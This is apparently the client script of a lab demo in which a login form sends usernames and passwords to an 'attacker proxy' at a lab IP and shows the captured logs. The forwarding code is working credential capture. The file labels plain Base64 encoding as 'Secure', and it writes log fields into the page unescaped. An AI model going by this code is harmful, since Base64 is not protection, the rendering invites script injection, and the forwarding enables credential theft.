// client/script.js

let currentMode = 'insecure';
// Replace this with the Attacker Laptop's IP Address
const ATTACKER_IP = '10.0.9.144'; 
const ATTACKER_URL = `http://${ATTACKER_IP}:4000`;

// 1. MODE SELECTION LOGIC
const insecureBtn = document.getElementById('insecure-mode');
const secureBtn = document.getElementById('secure-mode');
const modeDesc = document.getElementById('mode-desc');

insecureBtn.addEventListener('click', () => {
    currentMode = 'insecure';
    insecureBtn.classList.add('active');
    secureBtn.classList.remove('active');
    modeDesc.innerHTML = 'Current Mode: <strong>Insecure</strong>. Data is sent in raw plaintext.';
    updatePacketView();
});

secureBtn.addEventListener('click', () => {
    currentMode = 'secure';
    secureBtn.classList.add('active');
    insecureBtn.classList.remove('active');
    modeDesc.innerHTML = 'Current Mode: <strong>Secure</strong>. Password is Base64 encoded before transmission.';
    updatePacketView();
});

// 2. REAL-TIME PACKET SIMULATION VIEW
const usernameInput = document.getElementById('username');
const passwordInput = document.getElementById('password');
const packetContent = document.getElementById('packet-content');

function updatePacketView() {
    const user = usernameInput.value || '...';
    let pass = passwordInput.value || '...';

    // Simulation of Base64 encoding for UI view
    if (currentMode === 'secure' && passwordInput.value) {
        pass = btoa(pass); // Base64 Encoding
    }

    packetContent.textContent = `POST /login username=${user}&password=${pass}`;
}

usernameInput.addEventListener('input', updatePacketView);
passwordInput.addEventListener('input', updatePacketView);

// 3. LOGIN FORM SUBMISSION
const loginForm = document.getElementById('login-form');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();

    const username = usernameInput.value;
    let password = passwordInput.value;

    // SECURE MODE: ENCODE BEFORE SENDING
    if (currentMode === 'secure') {
        password = btoa(password); // Convert to Base64
    }

    try {
        const response = await fetch(`${ATTACKER_URL}/proxy-login`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                username,
                password,
                mode: currentMode
            })
        });

        const data = await response.json();
        alert(`Server Response: ${data.message}`);
        
        // Refresh logs immediately after login
        fetchLogs();
    } catch (err) {
        console.error('Error dispatching request:', err);
        alert('Could not reach Attacker Proxy. Make sure servers are running.');
    }
});

// 4. FETCH LOGS FROM ATTACKER DASHBOARD
async function fetchLogs() {
    try {
        const res = await fetch(`${ATTACKER_URL}/logs`);
        const logs = await res.json();
        
        const logBody = document.getElementById('log-body');
        logBody.innerHTML = ''; // Clear existing

        logs.reverse().forEach(log => {
            const row = `
                <tr>
                    <td>${log.timestamp}</td>
                    <td><span style="color: ${log.mode === 'secure' ? 'green' : 'red'}; font-weight: bold;">${log.mode.toUpperCase()}</span></td>
                    <td>${log.username}</td>
                    <td><code>${log.password}</code></td>
                    <td><code>${log.rawRequest}</code></td>
                </tr>
            `;
            logBody.innerHTML += row;
        });
    } catch (err) {
        console.error('Error fetching logs:', err);
    }
}

// Initial fetch and set interval for real-time updates
fetchLogs();
setInterval(fetchLogs, 2500); // Polling every 2.5 seconds
